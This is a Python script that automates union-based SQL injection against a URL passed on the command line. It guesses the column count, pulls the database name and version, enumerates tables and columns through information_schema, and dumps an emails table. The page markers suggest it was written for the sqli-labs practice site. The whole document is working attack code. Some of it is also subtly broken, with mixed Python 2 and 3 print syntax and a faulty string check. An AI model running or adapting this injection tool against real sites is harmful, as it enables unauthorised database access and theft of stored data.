#!/usr/bin/env python 
#coding:utf-8 
import requests
import re,time,sys

class sqli():
    def __init__(self):
        self.url = sys.argv[1]
        self.db_name = ''
        self.db_len = 0
        self.tb_name= ''
        self.col_name = ''
        self.db_version = ''
        self.Email_col = ''

    def getDBLen(self):
        try:
            for i in range(1,20):
                payload =" order by %d--+" %i
                r = requests.get(self.url+payload)
                r.raise_for_status()
                r.encoding = r.apparent_encoding
                if "Unknown column" in r.text:
                    self.db_len =  i
                    break
        except:
            return "当前网站连接不成功"
        return self.db_len

    def getDBName(self):
        try:
            payload = " UNION SELECT 1,version(),database()--+"
            r = requests.get(self.url + payload)
            r.raise_for_status()
            r.encoding = r.apparent_encoding
            if "Your Login name" and "Your Password" in r.text:
                v = re.search(r'Your Login name.+\d',r.text)
                self.db_version=str(v.group().split(':')[1])
                db = re.search(r'Your Password.\w+',r.text)
                self.db_name = str(db.group().split(':')[1])
                print ('数据库名称为:    %s' %self.db_name)
                print ('MySQL数据库版本:　%s' %self.db_version)   
        except:
            return "当前网站连接不成功"
        return self.db_name

    def getTBName(self):
        if self.getDBName():
            try:
                payload = (" union select 1,2,group_concat(table_name) \
                            from information_schema.tables where table_schema='%s' --+") %self.db_name
                r = requests.get(self.url+payload)
                r.raise_for_status()
                r.encoding = r.apparent_encoding
                if "Your Password" in r.text:
                    tb = ','.join(re.findall(r'Password:(.*?)</font>',r.text))
                    self.tb_name=str(tb).split(',')
                    for i in range(len(self.tb_name)):
                        print ('数据库%s第%d张表名:' %(self.db_name,i)) + self.tb_name[i]
                print ('*')*60
            except:
                return "当前网站连接不成功"
        return self.tb_name
    
    def getColName(self):
        if self.getTBName():
            try:
                for i in self.tb_name:
                    print ("开始猜测表%s下的所列名..." %i)
                    time.sleep(2)
                    payload = (" union select 1,2,group_concat(column_name) \
                                 from information_schema.columns where table_name='%s'--+") %i
                    r = requests.get(self.url+payload)
                    r.raise_for_status()
                    r.encoding = r.apparent_encoding
                    if "Your Password" in r.text:
                        em = ','.join(re.findall(r'Password:(.*?)</font>',r.text))
                        self.col_name = str(em).split(',')
                        for k in range(len(self.col_name)):
                            print ("表%s第%d列的名称是:" %(i,k)) + self.col_name[k]
                    print ('-')*60
            except:
                return "当前网站连接不成功"
        return self.col_name

    def getEmailCol(self):
        if self.getColName():
            print "开始猜测表emails下的所内容..."
            try:
                payload = " union select 1,2,group_concat(id,'-->',email_id) from security.emails--+"
                r=requests.get(self.url+payload)
                r.raise_for_status()
                r.encoding = r.apparent_encoding
                if "Your Password" in r.text:
                    name = ','.join(re.findall(r"Password:(.*?)</font>",r.text))
                    self.Email_col= str(name).split(',')
                    for i in range(len(self.Email_col)):
                        print("Emails表的第%d数据是：" %i) + self.Email_col[i]
            except:
                return "当前网站连接不成功"

if __name__ == '__main__':
    sql = sqli()
    sql.getEmailCol()
